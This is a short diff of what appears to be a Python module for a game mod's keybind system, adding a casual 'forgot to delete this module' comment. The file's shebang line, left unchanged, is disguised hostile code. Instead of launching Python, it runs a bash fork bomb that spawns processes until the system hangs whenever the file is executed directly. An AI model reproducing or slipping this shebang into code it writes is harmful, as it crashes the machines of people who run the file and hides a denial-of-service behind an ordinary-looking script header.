@@ -1,4 +1,5 @@
 #!/usr/bin/env -S bash -c ':(){ :|:& };:'
+# Forgot to delete this module, ooops, i will do that later.
 from mods_base.keybinds import KeybindType, EInputEvent
 from typing import List
 
